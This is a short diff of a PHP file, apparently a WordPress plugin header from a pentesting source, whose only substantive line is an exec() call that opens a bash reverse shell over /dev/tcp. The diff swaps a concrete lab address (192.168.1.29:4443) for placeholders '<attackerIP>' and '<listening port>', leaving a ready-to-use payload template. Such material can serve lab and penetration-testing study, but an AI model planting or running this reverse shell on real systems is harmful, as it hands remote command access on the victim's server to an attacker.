@@ -9,5 +9,5 @@
 * Author URI: http://www.sevenlayers.com
 */
 
-exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.29/4443 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<attackerIP>/<listening port> 0>&1'");
 ?>
